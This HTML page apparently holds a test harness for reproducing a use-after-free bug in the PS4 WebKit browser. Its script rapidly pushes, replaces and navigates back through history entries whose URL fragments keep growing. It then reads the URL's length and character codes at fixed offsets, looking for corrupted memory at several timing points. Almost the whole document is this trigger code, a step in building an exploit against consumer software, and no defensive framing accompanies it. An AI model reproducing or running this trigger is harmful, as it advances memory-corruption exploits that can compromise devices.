
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit â€“ UAF Chaotic Reproduction</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { margin:5px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h3>UAF Variability â€“ Original Chaotic Test</h3>

<button onclick="run()">RUN (NO RESET)</button>
<button onclick="logEl.textContent=''">CLEAR</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }

function probe(tag){
    let u = location.href;
    log(`[${tag}] URL.length=${u.length}`);
    [16,32,48,64,96,128,256].forEach(o=>{
        log(`[${tag}] cc(${o})=${u.charCodeAt(o)}`);
    });
}

/* ðŸ”¥ NÃƒO async / NÃƒO await / NÃƒO isolamento */
function triggerUAF_chaos(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);

        let cut = [31,33,35,47,63][Math.random()*5|0];
        history.replaceState({}, "", "#"+frag.slice(0, cut));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back()`);
        }

        // ðŸ”¥ leituras DURANTE mutaÃ§Ã£o
        if(i === 18 || i === 24 || i === 30){
            probe("MID-"+i);
        }

        size += STEP;
    }

    log(">>> WINDOW POSSIBLY OPEN <<<");

    // leituras competindo entre si
    probe("POST-IMM");
    setTimeout(()=>probe("POST-T0"),0);
    Promise.resolve().then(()=>probe("POST-MICRO"));
    requestAnimationFrame(()=>probe("POST-RAF"));
}

function run(){
    log("\n====== RUN ======");
    triggerUAF_chaos();
}
</script>

</body>
</html>
